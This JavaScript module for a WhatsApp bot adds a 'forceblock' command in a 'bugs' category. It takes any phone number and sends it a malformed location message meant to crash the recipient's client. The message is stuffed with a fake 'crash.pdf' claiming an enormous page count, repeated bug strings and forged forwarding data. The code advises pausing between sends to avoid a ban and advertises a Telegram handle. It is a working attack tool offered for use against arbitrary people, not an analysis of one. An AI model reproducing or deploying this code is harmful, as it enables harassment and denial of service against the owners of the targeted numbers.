const { cmd, commands } = require('../lib/command');
const config = require('../config');
const prefix = config.PREFIX;
const { bugUrl } = require('../lib/bugs/bugUrl.js');
const { bug } = require('../lib/bugs/bug.js');
const { exec } = require('child_process');
const { proto, generateWAMessageFromContent, downloadContentFromMessage, getContentType } = require('baileys-pro')
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
     

cmd({
    pattern: "forceblock",
    category: "bugs",
    desc: "Sends a hidden payload to a target number.",
    filename: __filename,
}, async (conn, mek, m, { q, reply, sender }) => {
    try {
        if (!q) return reply(`Use ${prefix}forceblock <number>\nExample: ${prefix}forceblock 2348130000000`);

        const target = q.replace(/[^0-9]/g, '');
        const targetNumber = target + "@s.whatsapp.net";

        await conn.sendMessage(targetNumber, {
                location: {
                    degreesLatitude: 'Telegram: @only_one_empire',
                    degreesLongitude: 'Telegram: @only_one_empire',
                    name: `Telegram: @only_one_empire`,
                    url: bugUrl,
                    contextInfo: {
                        forwardingScore: 508,
                        isForwarded: true,
                        isLiveLocation: true,
                        fromMe: false,
                        participant: '0@s.whatsapp.net',
                        remoteJid: sender,
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                title: "crash",
                                pageCount: 100000000000000000000,
                                fileName: "crash.pdf",
                                contactVcard: true
                            }
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: '120363274419284848@newsletter',
                            serverMessageId: 1,
                            newsletterName: " " + bug + bug
                        },
                        externalAdReply: {
                            title: ' Telegram: @only_one_empire ',
                            body: 'Telegram: @only_one_empire',
                            mediaType: 0,
                            thumbnail: m,
                            jpegThumbnail: m,
                            mediaUrl: `https://www.youtube.com/@dgxeon`,
                            sourceUrl: `https://www.youtube.com/@dgxeon`
                        }
                    }
                }
            }); 

        await conn.sendMessage(m.chat, {
            text: `forceblock sent to @${target} using forceblock ✅\nPause 2 minutes to avoid ban.`,
            mentions: [targetNumber]
        }, { quoted: m });

    } catch (err) {
        reply("Error: " + err.message);
    }
});